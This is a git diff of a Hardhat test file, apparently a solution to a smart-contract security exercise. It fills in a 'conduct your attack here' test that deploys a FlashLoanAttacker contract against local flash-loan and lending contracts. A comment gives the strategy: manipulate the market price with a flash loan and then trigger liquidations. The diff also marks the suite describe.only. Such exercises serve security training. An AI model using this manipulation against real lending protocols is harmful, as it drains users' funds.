@@ -5,7 +5,7 @@ const { ethers } = require("hardhat");
 const NAME = "FlashLoan tests";
 const OneHundred_Ether = "0x56bc75e2d63100000";
 
-describe(NAME, function () {
+describe.only(NAME, function () {
   async function setup() {
     const [owner, lender, borrower] = await ethers.getSigners();
     const TwentyEther = ethers.utils.parseEther("20");
@@ -116,8 +116,13 @@ describe(NAME, function () {
     });
 
     // prettier-ignore
+
+    //Use flash loan to affect market price and use lenders 'liquidate' method..
     it("conduct your attack here", async function () {
-      
+        const FlashLoanAttackerFactory = await ethers.getContractFactory("FlashLoanAttacker");
+        const flashLoanAttackerContract = await FlashLoanAttackerFactory.deploy(FlashLoanContract.address,
+                                                            LendingContract.address, borrower.address);
+        await flashLoanAttackerContract.connect(lender).attack({value: ethers.utils.parseEther("90")});
     });
 
     after(async function () {
